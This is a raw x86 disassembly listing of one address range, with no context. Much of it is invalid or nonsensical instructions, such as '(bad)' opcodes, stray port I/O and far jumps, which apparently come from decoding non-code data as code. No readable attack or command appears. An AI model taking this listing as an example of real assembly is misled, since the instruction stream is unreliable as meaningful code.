  413936:	xchg   edx,eax
  413937:	aas    
  413938:	pop    edi
  413939:	sbb    DWORD PTR [esi],ecx
  41393b:	inc    ebx
  41393c:	sub    eax,0xe3320940
  413941:	ret    
  413942:	lea    edx,[esi-0x31]
  413945:	add    edi,DWORD PTR [esi]
  413947:	inc    edx
  413948:	jle    0x4138d9
  41394a:	push   0x63
  41394c:	aas    
  41394d:	mov    al,0x79
  41394f:	xor    ch,BYTE PTR [edi]
  413951:	(bad)
  413955:	sbb    edx,ebp
  413957:	xor    DWORD PTR [ebp-0x47a92605],edx
  41395d:	mov    cs,eax
  41395f:	xor    DWORD PTR [ebp-0x64b82661],edx
  413965:	mov    ?,WORD PTR [eax-0x666c8acf]
  41396b:	fisub  WORD PTR [edx+0x8e]
	...
  413995:	add    BYTE PTR [eax],al
  413997:	add    BYTE PTR [eax-0x4b686b1b],ch
  41399d:	dec    esp
  41399e:	out    0x18,al
  4139a0:	xchg   edx,eax
  4139a1:	xor    DWORD PTR [edx],edi
  4139a3:	cld    
  4139a4:	nop
  4139a5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4139a6:	rcr    DWORD PTR [ebx-0x71317279],cl
  4139ac:	jbe    0x4139ca
  4139ae:	hlt    
  4139af:	add    edx,DWORD PTR [ebx]
  4139b1:	out    0xcb,al
  4139b3:	mov    gs,edx
  4139b5:	pop    esi
  4139b6:	mov    edi,0xaf320642
  4139bb:	cli    
  4139bc:	mov    eax,ds:0x681bd0a6
  4139c1:	mov    bh,0x28
  4139c3:	add    al,0xee
  4139c5:	inc    edx
  4139c6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4139c7:	ss dec ecx
  4139c9:	xor    DWORD PTR [eax],edi
  4139cb:	sbb    al,0x8c
  4139cd:	sbb    eax,0x5ba60428
  4139d2:	out    0x9e,eax
  4139d4:	repz ret 
  4139d6:	add    ch,ch
  4139d8:	arpl   WORD PTR [edx-0x584ee700],bx
  4139de:	or     BYTE PTR [ecx+0x17],dl
  4139e1:	mov    dh,0xfd
  4139e3:	pop    esi
  4139e4:	mov    ch,0xee
  4139e6:	push   ecx
  4139e7:	push   esi
  4139e8:	mov    eax,0xa5dd7431
  4139ed:	pop    esi
  4139ee:	pop    eax
  4139ef:	inc    esi
  4139f0:	enter  0xc065,0xb5
  4139f4:	adc    bh,BYTE PTR [ecx+0x5b82ccf3]
  4139fa:	push   eax
  4139fb:	inc    ecx
	...
  413a24:	add    BYTE PTR [eax],al
  413a26:	push   edi
  413a27:	mov    ebp,edi
  413a29:	es or  eax,0x7d2ab2c3
  413a2f:	pop    ebx
  413a30:	push   0xbf403de9
  413a35:	cmp    DWORD PTR [ecx],0x6de93fb9
  413a3b:	xor    BYTE PTR [ecx+esi*8-0x2b],dh
  413a3f:	pop    es
  413a40:	jnp    0x413a38
  413a42:	mov    ebx,0xb09a8838
  413a47:	xor    eax,ecx
  413a49:	stos   DWORD PTR es:[edi],eax
  413a4a:	call   0xc4dd:0xde725530
  413a51:	aad    0x24
  413a53:	pop    ebx
  413a54:	push   0xd
  413a56:	mov    bl,0xa7
  413a58:	or     cl,dl
  413a5a:	pop    ss
  413a5b:	mov    al,ds:0x96f5befd
  413a60:	cld    
  413a61:	inc    ebx
  413a62:	push   esp
  413a63:	xor    DWORD PTR [ecx+eiz*8-0x3b],esi
  413a67:	sar    ch,0xa6
  413a6a:	retf   
  413a6b:	ret    0x9e21
  413a6e:	sub    DWORD PTR [ebx-0x18],esp
  413a71:	btc    DWORD PTR [ecx],esi
  413a74:	inc    BYTE PTR [ebx]
  413a76:	dec    esi
  413a77:	xor    DWORD PTR [eax+eax*1+0x2f],esi
  413a7b:	aam    0x59
  413a7d:	push   DWORD PTR [eax-0x4c8a0122]
  413a83:	fidiv  WORD PTR [eax+ecx*1-0x41]
  413a87:	pop    ss
  413a88:	dec    esi
  413a89:	inc    DWORD PTR [eax]
	...
  413ab3:	add    BYTE PTR [eax+0x2704bff4],ah
  413ab9:	imul   ecx,DWORD PTR [ecx+0xc4870ec],0xfd6687e8
  413ac3:	(bad)  
  413ac4:	in     al,dx
  413ac5:	sbb    esi,DWORD PTR [edx+0x24]
  413ac8:	cmovae esp,DWORD PTR [ecx+eax*2-0x29]
  413acd:	imul   ebp,eax,0x1c
  413ad0:	enter  0xfede,0x50
  413ad4:	scas   eax,DWORD PTR es:[edi]
  413ad5:	pop    ebx
  413ad6:	add    bh,ch
  413ad8:	jno    0x413b29
  413ada:	cs xchg si,ax
  413add:	pop    ebx
  413ade:	push   eax
  413adf:	jmp    FWORD PTR [edx-0x3cf819cd]
  413ae5:	fdivp  st(6),st
  413ae7:	call   0x3ea583
  413aec:	pop    esi
  413aed:	sbb    eax,0xb2ca0006
  413af2:	jmp    0x6821267a
  413af7:	add    ch,ch
  413af9:	pop    ds
  413afa:	push   DWORD PTR [ebp-0x61]
  413afd:	shr    DWORD PTR [edi],cl
  413aff:	push   eax
  413b00:	jo     0x413ae0
  413b02:	mov    BYTE PTR [ebp-0x7d],al
  413b05:	push   ecx
  413b06:	sbb    bh,bh
  413b08:	sub    ch,BYTE PTR [edi]
  413b0a:	out    0xaa,al
  413b0c:	mov    al,0xde
  413b0e:	(bad)  
  413b0f:	push   0x34
  413b11:	fidiv  WORD PTR [eax+ecx*1-0x51]
  413b15:	mov    ebx,0xfffe
	...
  413b42:	mov    al,0x51
  413b44:	sbb    al,0xff
  413b46:	ds dec edi
  413b48:	cld    
  413b49:	out    0xa8,eax
  413b4b:	loopne 0x413ad9
  413b4d:	(bad)  
  413b4e:	cmp    DWORD PTR [eax],esi
  413b50:	mov    ?,esi
  413b52:	stos   DWORD PTR es:[edi],eax
  413b53:	sub    al,0x9a
  413b55:	dec    ebx
  413b56:	mov    fs,WORD PTR [ebp+0x38fcc88c]
  413b5c:	add    dl,BYTE PTR [ebp-0x3b]
  413b5f:	mov    BYTE PTR [eax+0x17e616c3],al
  413b65:	add    BYTE PTR [esi+eax*2-0x63c98b75],dl
  413b6c:	pushf  
  413b6d:	dec    esi
  413b6e:	stc    
  413b6f:	xchg   ebp,eax
  413b70:	jp     0x413bb6
  413b72:	repnz test eax,0x3762dce
  413b78:	add    al,BYTE PTR [eax+0x47164421]
  413b7e:	pushw  cs
  413b80:	and    al,0x41
  413b82:	ds in  eax,0x99
  413b85:	adc    DWORD PTR [ecx],ecx
  413b87:	inc    esp
  413b88:	add    cl,BYTE PTR [ebx]
  413b8a:	dec    al
  413b8c:	xlat   BYTE PTR ds:[ebx]
  413b8d:	push   esi
  413b8e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413b8f:	fisubr WORD PTR ds:0xc229b1ff
  413b95:	jae    0x413bf5
  413b97:	mov    ebx,0x4416f846
  413b9c:	add    ch,bh
  413b9e:	fmul   DWORD PTR [ecx+ecx*8-0x74bc009b]
  413ba5:	je     0x413ba7
	...
  413bcf:	add    BYTE PTR [esi-0x69f7effb],al
  413bd5:	call   0xf810:0x1579ff0d
  413bdc:	data16 je 0x413c15
  413bdf:	jmp    FWORD PTR [ecx-0x18]
  413be2:	aad    0xbf
  413be4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413be5:	std    
  413be6:	mov    esi,edi
  413be8:	pop    ecx
  413be9:	pop    ebx
  413bea:	cdq    
  413beb:	pop    edx
  413bec:	or     DWORD PTR [esi+0x14],edx
  413bef:	dec    ebp
  413bf0:	dec    eax
  413bf1:	test   al,0x93
  413bf3:	mov    ecx,edx
  413bf5:	bound  edi,QWORD PTR [edi-0x4f]
  413bf8:	mov    BYTE PTR [esi],ch
  413bfa:	xchg   DWORD PTR [ebx],ebp
  413bfc:	pop    es
  413bfd:	sbb    esp,esp
  413bff:	add    edx,DWORD PTR [ebx-0x2787c1e]
  413c05:	ss pop ss
  413c07:	push   ds
  413c08:	shl    DWORD PTR ds:[esi],0x8b
  413c0c:	mov    ah,BYTE PTR [ebx+0x4f]
  413c0f:	adc    edi,DWORD PTR [ecx+0x2e]
  413c12:	push   edi
  413c13:	jge    0x413c8f
  413c15:	das    
  413c16:	arpl   cx,cx
  413c18:	sub    esp,DWORD PTR [ebx+0x6dbe03a8]
  413c1e:	out    0xf,eax
  413c20:	add    ebx,0x5b7f21ab
  413c26:	xchg   esi,eax
  413c27:	fwait
  413c28:	mov    bh,0x6c
  413c2a:	out    0x3,eax
  413c2c:	inc    ebp
  413c2d:	sbb    edx,DWORD PTR [ebp+ebx*8+0x2f064370]
	...
  413c5c:	add    BYTE PTR [eax],al
  413c5e:	shr    DWORD PTR ds:0x7b2dc3e3,0x70
  413c65:	inc    ecx
  413c66:	mov    dh,0xc2
  413c68:	out    0x3,eax
  413c6a:	cdq    
  413c6b:	in     al,dx
  413c6c:	jg     0x413ca6
  413c6e:	sbb    BYTE PTR [edi+eiz*8-0x18cced76],bl
  413c75:	adc    BYTE PTR [esi+0x43],al
  413c78:	fimul  DWORD PTR ds:0x10d72d89
  413c7e:	xchg   BYTE PTR [edx-0x30],al
  413c81:	xor    al,0x79
  413c83:	sub    eax,0xf3b1d6c4
  413c88:	mov    esi,0x12d688a
  413c8d:	mov    ebx,0x34056607
  413c92:	or     esi,DWORD PTR [esi-0x104b1700]
  413c98:	push   0x9c1c2c
  413c9d:	add    esp,ebx
  413c9f:	mov    bh,0x3f
  413ca1:	jmp    0x9149e46a
  413ca6:	sub    eax,0x4b7efdb2
  413cab:	pop    ebx
  413cac:	push   0x9a5c1f
  413cb1:	add    ebx,eax
  413cb3:	mov    dh,0x3f
  413cb5:	jmp    0xb1eba47e
  413cba:	sbb    BYTE PTR [ebx-0x18],0x3d
  413cbe:	push   ecx
  413cbf:	sub    al,0xfe
  413cc1:	pusha  
	...
  413cea:	add    BYTE PTR [eax],al
  413cec:	jle    0x413d2d
  413cee:	imul   ebp,ecx,0x55
  413cf1:	mov    eax,0xc33da866
  413cf6:	jg     0x413cc7
  413cf8:	jp     0x413d55
  413cfa:	std    
  413cfb:	hlt    
  413cfc:	jnp    0x413c92
  413cfe:	aas    
  413cff:	jmp    0x1e962fb9
  413d04:	mov    ah,0xe3
  413d06:	inc    ebx
  413d07:	sbb    eax,0x7e685b23
  413d0c:	pop    edi
  413d0d:	call   0xe93f:0xb6ba9100
  413d14:	mov    ah,0x67
  413d16:	stos   BYTE PTR es:[edi],al
  413d17:	mov    eax,ds:0x49e85afa
  413d1c:	imul   ebp,DWORD PTR [esi+edi*8],0x8c2b5170
  413d23:	and    al,0xde
  413d25:	pushf  
  413d26:	push   0x9a5c51
  413d2b:	inc    ecx
  413d2c:	mov    ebp,0x67003fb6
  413d31:	jecxz  0x413d67
  413d33:	stos   BYTE PTR es:[edi],al
  413d34:	das    
  413d35:	cwde   
  413d36:	add    al,ch
  413d38:	shr    DWORD PTR [edx-0x3],cl
  413d3b:	(bad)  
  413d3c:	fisubr WORD PTR [ebx-0x18]
  413d3f:	sbb    DWORD PTR [edx],0xffffffcb
  413d42:	std    
  413d43:	jae    0x413d54
  413d45:	(bad)  
  413d46:	jl     0x413d38
  413d48:	push   edi
  413d49:	pop    esp
  413d4a:	inc    edx
  413d4b:	or     DWORD PTR [edx-0x2d],0xfffffffd
  413d4f:	jae    0x413d51
	...
  413d79:	add    bl,bh
  413d7b:	dec    edi
  413d7c:	(bad)  
  413d7d:	(bad)  
  413d7e:	mov    eax,0x1f75fea0
  413d83:	sar    dl,1
  413d85:	dec    ebp
  413d86:	test   al,0xe2
  413d88:	(bad)  
  413d89:	jne    0x413dfe
  413d8b:	loop   0x413e01
  413d8d:	or     BYTE PTR [edi+0x65],ch
  413d90:	dec    esi
  413d91:	jmp    FWORD PTR [eax-0x1e]
  413d94:	je     0x413d86
  413d96:	mov    BYTE PTR [eax+ecx*1-0x18],bl
  413d9a:	mov    al,ds:0x28fffd71
  413d9f:	pop    esp
  413da0:	in     al,dx
  413da1:	jmp    DWORD PTR [edx-0x46c319d1]
  413da7:	loop   0x413da7
  413da9:	push   DWORD PTR [edx+0x2f75fecb]
  413daf:	loop   0x413e25
  413db1:	or     BYTE PTR [edi],bh
  413db3:	push   ebp
  413db4:	dec    esi
  413db5:	dec    DWORD PTR [eax-0x1e]
  413db8:	je     0x413da6
  413dba:	dec    edi
  413dbb:	es push ecx
  413dbd:	jmp    FWORD PTR [eax+0x3ff474e2]
  413dc3:	cs push ecx
  413dc5:	jmp    FWORD PTR [eax+0x6ff074e2]
  413dcb:	push   esi
  413dcc:	dec    edi
  413dcd:	jmp    FWORD PTR [eax-0x1e]
  413dd0:	je     0x413dba
  413dd2:	sbb    cl,BYTE PTR ds:[ebp-0x76e386b1]
  413dd9:	je     0x413e4d
  413ddb:	adc    al,0xf
  413ddd:	or     BYTE PTR [eax],al
	...
  413e07:	add    BYTE PTR [esi-0x65],dl
  413e0a:	cmp    bh,bh
  413e0c:	popa   
  413e0d:	inc    esp
  413e0e:	mov    ecx,0x2f4242c1
  413e13:	mov    esp,DWORD PTR [edx-0x40]
  413e16:	mov    ebp,0x1c41d4fb
  413e1b:	inc    eax
  413e1c:	inc    ecx
  413e1d:	dec    esi
  413e1e:	cld    
  413e1f:	out    0x4f,eax
  413e21:	dec    edx
  413e22:	xchg   esi,edi
  413e24:	(bad)  
  413e25:	ja     0x413daf
  413e27:	imul   edi,DWORD PTR [esi],0xeb68044e
  413e2d:	pop    edx
  413e2e:	inc    ecx
  413e2f:	add    BYTE PTR [esi-0x41fffdcc],ah
  413e35:	mov    WORD PTR [edx+edx*2-0x400375f7],gs
  413e3c:	mov    dl,BYTE PTR [ebp+0x34]
  413e3f:	call   0xfeca2d09
  413e44:	inc    ebp
  413e45:	je     0x413e54
  413e47:	sbb    DWORD PTR [esi-0x2efffdf4],ecx
  413e4d:	mov    dl,0x19
  413e4f:	mov    al,0x60
  413e51:	repz add DWORD PTR [eax-0x2f],edx
  413e55:	(bad)  
  413e56:	stc    
  413e57:	out    0xad,eax
  413e59:	sti    
  413e5a:	mov    dh,bh
  413e5c:	(bad)  
  413e5d:	mov    al,0x31
  413e5f:	(bad)  
  413e60:	mov    ecx,0xb1fc0e59
  413e65:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413e66:	stc    
  413e67:	out    0x39,eax
  413e69:	cli    
  413e6a:	mov    dh,bh
	...
  413e94:	add    BYTE PTR [eax],al
  413e96:	ja     0x413f0e
  413e98:	std    
  413e99:	push   edx
  413e9b:	mov    esp,0x5b7a8295
  413ea0:	jecxz  0x413ed1
  413ea2:	adc    al,0x5b
  413ea4:	push   ecx
  413ea5:	inc    ebp
  413ea6:	xor    DWORD PTR [eax-0x67506421],0xa0c687ce
  413eb0:	ret    
  413eb1:	jnp    0x413edd
  413eb3:	jns    0x413ee4
  413eb5:	inc    ebp
  413eb6:	ds fcomi st,st(6)
  413eb9:	add    edx,edx
  413ebb:	call   0x2ee7:0x9bdbb33f
  413ec2:	push   esi
  413ec3:	adc    ah,bl
  413ec5:	add    edi,DWORD PTR [esi]
  413ec7:	push   esi
  413ec8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413ec9:	adc    BYTE PTR [ebp-0x6e],bl
  413ecc:	jg     0x413eab
  413ece:	xchg   edi,eax
  413ecf:	sub    al,BYTE PTR [edi-0x1f511605]
  413ed5:	xor    edx,DWORD PTR [esi-0x246918a5]
  413edb:	mov    dl,0x90
  413edd:	push   ds
  413ede:	jg     0x413f3b
  413ee0:	mov    bh,0x86
  413ee2:	xchg   edx,eax
  413ee3:	push   ebx
  413ee4:	dec    edi
  413ee5:	aad    0x86
  413ee7:	sub    dl,BYTE PTR [edi-0x64]
  413eea:	aaa    
  413eeb:	mov    ecx,DWORD PTR [esi-0x79]
  413eee:	cmc    
  413eef:	ins    DWORD PTR es:[edi],dx
  413ef0:	daa    
  413ef1:	dec    ebp
  413ef2:	call   0xefc87e20
  413ef7:	clc    
  413ef8:	out    dx,eax
  413ef9:	inc    BYTE PTR [eax]
	...
  413f23:	add    BYTE PTR [edx+0x1b],dl
  413f26:	das    
  413f27:	adc    edx,edx
  413f29:	sub    DWORD PTR [ebp-0x53361e05],ebx
  413f2f:	xchg   al,al
  413f31:	mov    DWORD PTR [eax],esp
  413f33:	ret    0x5b3d
  413f36:	mov    ah,0x7a
  413f38:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413f39:	(bad)  [ebx]
  413f3b:	mov    BYTE PTR [eax],dl
  413f3d:	mov    ch,0xe7
  413f3f:	sbb    esp,edi
  413f41:	sub    DWORD PTR [ecx],eax
  413f43:	jl     0x413eda
  413f45:	inc    ecx
  413f46:	inc    eax
  413f47:	pushf  
  413f48:	mov    eax,0xb62c8828
  413f4d:	aam    0x3b
  413f4f:	cmovb  ebx,DWORD PTR [eax+eax*1+0x72298069]
  413f57:	sub    DWORD PTR [edx+0x34],edx
  413f5a:	sub    BYTE PTR [bp+si-0x6e],al
  413f5e:	call   0xfe6ab5a8
  413f63:	loop   0x413fe2
  413f65:	lods   eax,DWORD PTR ds:[esi]
  413f66:	and    DWORD PTR [esi],edx
  413f68:	mov    dl,0xf1
  413f6a:	push   edi
  413f6b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413f6c:	rcl    BYTE PTR [eax+eax*8+0x15],0x53
  413f71:	cdq    
  413f72:	push   0xbf383de9
  413f77:	add    edx,ecx
  413f79:	mov    esi,0x286de93f
  413f7e:	je     0x413f71
  413f80:	(bad)
  413f83:	jbe    0x413f45
  413f85:	inc    eax
  413f86:	enter  0x1e,0x0
	...
  413fb2:	mov    ecx,0x21afd29
  413fb7:	in     al,0xfd
  413fb9:	pop    esi
  413fba:	mov    eax,0x587f329
  413fbf:	bound  esi,QWORD PTR [ebx+0x29]
  413fc2:	push   edi
  413fc3:	jl     0x413fad
  413fc5:	cmc    
  413fc6:	sbb    DWORD PTR [eax],ebp
  413fc8:	(bad)  
  413fc9:	repnz std 
  413fcb:	lods   al,BYTE PTR ds:[esi]
  413fcc:	and    al,0xc1
  413fce:	(bad)  
  413fcf:	mov    esi,0x330de93f
  413fd4:	cdq    
  413fd5:	mov    edx,0x915129c0
  413fda:	cmp    eax,0x5557ed5b
  413fdf:	sub    esp,DWORD PTR [edi-0x58]
  413fe2:	cmp    eax,0x2a00fd8b
  413fe7:	and    al,0xe6
  413fe9:	cmp    DWORD PTR [edi+0x23e8fee1],0x71
  413ff0:	std    
  413ff1:	(bad)  
  413ff2:	mov    ebp,0x44dde63d
  413ff7:	fdivp  st(6),st
  413ff9:	or     edx,edi
  413ffb:	dec    ebx
  413ffc:	and    al,0x68
  413ffe:	gs inc edi
  414000:	aas    
  414001:	add    BYTE PTR [edi],dh
  414003:	(bad)  
  414004:	push   0x4dde8053
  414009:	push   0xbeed5c57
  41400e:	dec    esi
  414010:	arpl   WORD PTR [ecx+0x67],ax
  414013:	ins    BYTE PTR es:[edi],dx
  414014:	std    
  414015:	jne    0x414017
	...
  41403f:	add    BYTE PTR [edi-0x3c],cl
  414042:	push   ecx
  414043:	js     0x413fe5
  414045:	fsubrp st(5),st
  414047:	pop    ebp
  414048:	pusha  
  414049:	fdivp  st(6),st
  41404b:	dec    DWORD PTR [edx-0x2d]
  41404e:	(bad)  
  41404f:	jne    0x414080
  414051:	(bad)  
  414052:	int    0x4c
  414054:	mov    al,ds:0xe5c95ede
  414059:	pop    edx
  41405a:	add    BYTE PTR [ebp-0x64],dl
  41405d:	ret    
  41405e:	add    ah,0x67
  414061:	mov    al,0x44
  414063:	lock (bad) 
  414065:	fidiv  WORD PTR [esp+ecx*1+0x7f]
  414069:	(bad)  
  41406a:	push   ecx
  41406b:	inc    DWORD PTR [eax-0x1a8b41de]
  414071:	fidivr DWORD PTR [esp+edi*8-0x2b]
  414075:	push   ebp
  414076:	and    DWORD PTR [ebx-0x7e9c2c56],ecx
  41407c:	iret   
  41407d:	mov    ebp,cr6
  414080:	fidiv  WORD PTR ds:[eax+edx*1+0x20]
  414085:	pop    eax
  414086:	or     al,ch
  414088:	ds jg  0x4140c2
  41408b:	push   DWORD PTR [ecx-0x5603f2a8]
  414091:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414092:	mov    esi,edi
  414094:	sub    ebp,DWORD PTR [edx]
  414096:	call   0xfb8c:0x853105f4
  41409d:	and    DWORD PTR [edx],esi
  41409f:	call   0xfec4a7ef
	...
  4140cc:	add    BYTE PTR [eax],al
  4140ce:	ja     0x4140c3
  4140d0:	cmc    
  4140d1:	call   DWORD PTR [edx]
  4140d3:	mov    ebp,0x97a8295
  4140d8:	sbb    BYTE PTR [eax],al
  4140da:	aam    0x74
  4140dc:	xor    DWORD PTR [esi+esi*1+0xa],0xffffffdd
  4140e1:	dec    ebx
  4140e2:	pop    ecx
  4140e3:	lock jp 0x41412a
  4140e6:	push   edx
  4140e7:	fwait
  4140e8:	add    al,0x6a
  4140ea:	ds dec edx
  4140ec:	hlt    
  4140ed:	push   WORD PTR [ecx]
  4140f0:	sbb    al,BYTE PTR [edx]
  4140f2:	ds xor al,0x82
  4140f5:	out    0x2f,eax
  4140f7:	fs cmp esi,0x35
  4140fb:	hlt    
  4140fc:	or     eax,0x8c7fb73f
  414101:	addr16 jp 0x414159
  414104:	inc    ecx
  414105:	add    BYTE PTR [ecx],dl
  414107:	xor    BYTE PTR [edx+0x47947e7],cl
  41410d:	add    BYTE PTR ds:0xf9230d74,dh
  414113:	pop    es
  414114:	mov    ah,bh
  414116:	(bad)
  414119:	dec    BYTE PTR [esi+0x7ec9310c]
  41411f:	xor    al,0x1a
  414121:	add    BYTE PTR [esi],bh
  414123:	popf   
  414124:	inc    ebx
  414125:	imul   edi,DWORD PTR [esi],0x367484c4
  41412b:	pop    ebx
  41412c:	setns  BYTE PTR [edx+0x26]
  414130:	pop    ds
  414131:	fwait
	...
  41415a:	add    BYTE PTR [eax],al
  41415c:	fist   DWORD PTR [ebp-0x4f4f7bea]
  414162:	setnp  bl
  414165:	xchg   ebp,eax
  414166:	push   es
  414167:	test   BYTE PTR [eax+0x1283fbb0],ah
  41416d:	push   ebx
  41416e:	(bad)  
  41416f:	stc    
  414170:	add    eax,0x7fb9ef26
  414175:	pop    edi
  414176:	out    0xd8,eax
  414178:	mov    ah,0x37
  41417a:	imul   ecx,DWORD PTR [eax+0x75],0xffffffb1
  41417e:	out    0xed,eax
  414180:	std    
  414181:	and    eax,0xf8560c55
  414186:	xor    al,BYTE PTR [ebx-0x7fdb2ba0]
  41418c:	loope  0x4141e8
  41418e:	out    0x72,eax
  414190:	xchg   ebx,eax
  414191:	mov    bl,0x3e
  414193:	jmp    0x414193
  414195:	pop    edx
  414196:	psubsb mm3,mm0
  414199:	fwait
  41419a:	out    0x82,eax
  41419c:	mov    dl,0x53
  41419e:	jg     0x41413c
  4141a0:	test   al,0x26
  4141a2:	pop    DWORD PTR [ebx-0x678d84e]
  4141a8:	cmp    DWORD PTR [ebx],esi
  4141aa:	scas   al,BYTE PTR es:[edi]
  4141ab:	iret   
  4141ac:	sbb    BYTE PTR [esi],ah
  4141ae:	mov    eax,ds:0x145b3d46
  4141b3:	(bad)  
  4141b4:	adc    eax,0x997c2bda
  4141b9:	pop    ebx
  4141ba:	out    0x72,eax
  4141bc:	mov    ebx,0xbdd25
	...
  4141e9:	add    dh,ah
  4141eb:	xor    BYTE PTR [edx-0x42da177e],ah
  4141f1:	psraw  mm5,QWORD PTR [edi-0x6d819411]
  4141f8:	add    BYTE PTR [esi],dh
  4141fa:	mov    ebp,0xbcd97424
  4141ff:	scas   al,BYTE PTR es:[edi]
  414200:	or     BYTE PTR [ecx],dl
  414202:	add    al,0x92
  414204:	std    
  414205:	push   ds
  414206:	mov    ebp,0xb71618ae
  41420b:	dec    ecx
  41420c:	std    
  41420d:	xchg   esp,eax
  41420e:	xor    eax,0xbcb3fd33
  414213:	and    al,0x69
  414215:	dec    edi
  414216:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414217:	call   0x6de8:0x5596f600
  41421e:	dec    ebx
  41421f:	pop    ebx
  414220:	add    dl,dh
  414222:	std    
  414223:	scas   al,BYTE PTR es:[edi]
  414224:	arpl   WORD PTR [ecx-0x4e],dx
  414227:	mov    esp,0x15e5e93f
  41422c:	cmp    ecx,ebp
  41422e:	cmp    eax,0x55c143d4
  414233:	cmc    
  414234:	sub    BYTE PTR gs:[edx+0x26],al
  414238:	je     0x414213
  41423a:	in     eax,0x87
  41423c:	cmp    ch,cl
  41423e:	cmp    eax,0x341dc052
  414243:	pop    edx
  414244:	inc    ebx
  414245:	mov    eax,ds:0x96109fca
  41424a:	ss push ebp
  41424c:	call   0x41431f
	...
  414275:	add    BYTE PTR [eax],al
  414277:	add    BYTE PTR [eax],bl
  414279:	es (bad) 
  41427b:	push   0xffffffa5
  41427d:	and    eax,0x9fcab575
  414282:	cld    
  414283:	add    DWORD PTR [ebx],edi
  414285:	pop    ebx
  414286:	in     eax,dx
  414287:	das    
  414288:	mov    esp,0x95108af
  41428d:	xchg   ebx,eax
  41428e:	std    
  41428f:	pop    esi
  414290:	mov    esp,0xf6560caf
  414295:	pop    esp
  414296:	call   0xfe673dbd
  41429b:	add    BYTE PTR [eax+0x23],bh
  41429e:	cli    
  41429f:	call   DWORD PTR [edx-0x62a117b0]
  4142a5:	fsin   
  4142a7:	call   DWORD PTR [edx-0x3c8a02c0]
  4142ad:	fnstenv [eax+ecx*1+0x4f]
  4142b1:	rol    BYTE PTR [edi-0x1],cl
  4142b4:	dec    eax
  4142b5:	xchg   edi,eax
  4142b6:	mov    edi,0x8b039714
  4142bb:	in     al,dx
  4142bc:	adc    al,0x9c
  4142be:	cmc    
  4142bf:	push   esi
  4142c0:	and    al,0x9b
  4142c2:	push   eax
  4142c3:	dec    ebx
  4142c4:	out    0x58,al
  4142c6:	add    BYTE PTR [ebx+ebx*1-0x23],dh
  4142ca:	cmp    al,0x4c
  4142cc:	dec    esp
  4142cd:	sbb    dh,bh
  4142cf:	call   DWORD PTR [ebx]
  4142d1:	cmp    DWORD PTR cs:0x4115e3,0x57
  4142d9:	sub    al,0x68
  4142db:	mov    DWORD PTR [eax],0x0
	...
  414305:	add    BYTE PTR [edx],dl
  414307:	(bad)  
  414309:	jmp    DWORD PTR [edi+0x58]
  41430c:	lds    eax,FWORD PTR [ebp-0x71]
  41430f:	pop    edi
  414310:	add    BYTE PTR [eax],al
  414312:	push   edi
  414313:	aad    0x44
  414315:	cld    
  414316:	pop    es
  414317:	aam    0x44
  414319:	clc    
  41431a:	ja     0x414351
  41431c:	(bad)  
  41431d:	addr16 dec esi
  41431f:	xor    al,BYTE PTR [ecx+0x0]
  414322:	mov    eax,0x564b4c4b
  414327:	pop    edi
  414328:	or     eax,eax
  41432a:	adc    ebx,DWORD PTR [edi]
  41432c:	cmp    DWORD PTR [ebp-0x71],0x5f
  414330:	je     0x41436f
  414332:	xchg   esp,eax
  414333:	and    al,0xfa
  414335:	add    bl,ah
  414337:	bound  ecx,QWORD PTR [ecx+0x1bb69b75]
  41433d:	push   esi
  41433e:	ds mov ecx,0x2a70ff3a
  414344:	xor    DWORD PTR [ebp+0x42],0xd907fa9d
  41434b:	jmp    0x41437e
  41434d:	dec    DWORD PTR [ebx+0x3a]
  414350:	push   0xffffffdd
  414352:	enter  0x7f74,0x5d
  414356:	shr    esi,0x79
  414359:	add    BYTE PTR [eax-0x49837ac3],0x31
  414360:	test   BYTE PTR [edi*4-0x768afded],0x5c
  414368:	cmc    
  414369:	sti    
	...
  414392:	add    BYTE PTR [eax],al
  414394:	cdq    
  414395:	push   cs
  414396:	ror    BYTE PTR [edx-0x1],cl
  414399:	xor    eax,esp
  41439b:	enter  0x3d7c,0x2
  41439f:	push   ebp
  4143a0:	mov    ch,0xd
  4143a2:	test   ebx,eax
  4143a4:	jb     0x414406
  4143a6:	inc    edi
  4143a7:	inc    esp
  4143a8:	jbe    0x4143db
  4143aa:	add    al,BYTE PTR [eax]
  4143ac:	ds std 
  4143ae:	(bad)  
  4143af:	repz xor al,BYTE PTR ds:[edx]
  4143b3:	add    BYTE PTR [ecx+0x6e],bl
  4143b6:	adc    al,0x8f
  4143b8:	sti    
  4143b9:	in     eax,dx
  4143ba:	push   edx
  4143bb:	ins    BYTE PTR es:[edi],dx
  4143bc:	dec    edx
  4143bd:	xchg   edi,eax
  4143be:	add    al,0x6a
  4143c0:	ds dec eax
  4143c2:	add    al,0x6a
  4143c4:	ds shl esi,0xfb
  4143c8:	xor    DWORD PTR [eax+0x10],eax
  4143cb:	push   0x3e
  4143cd:	pop    esi
  4143ce:	add    al,0xe8
  4143d0:	inc    ebx
  4143d1:	sbb    al,0x2
  4143d3:	add    BYTE PTR [ebp-0xc],al
  4143d6:	cmc    
  4143d7:	xor    al,0x6e
  4143d9:	inc    esp
  4143da:	ins    BYTE PTR es:[edi],dx
  4143db:	loopne 0x414457
  4143dd:	mov    cl,0x80
  4143df:	mov    BYTE PTR [ebx+0x5b],bh
  4143e2:	pop    edi
  4143e3:	fisub  DWORD PTR [edi+0x5b]
  4143e6:	rol    DWORD PTR [ebx],1
  4143e8:	(bad)  
  4143e9:	and    bl,ch
  4143eb:	jnp    0x4143d5
  4143ed:	test   al,0x4b
  4143ef:	sub    BYTE PTR [edx+0x4f],0xd1
  4143f3:	add    esp,DWORD PTR [ebx+ebx*2+0x4f]
  4143f7:	js     0x4143f9
	...
  414421:	add    BYTE PTR [eax],cl
  414423:	pop    ebx
  414424:	out    0xc,eax
  414426:	(bad)  
  414427:	test   al,0xde
  414429:	or     BYTE PTR [edx+0x23],0x10
  41442d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41442e:	add    eax,0xfa481f22
  414433:	and    ch,al
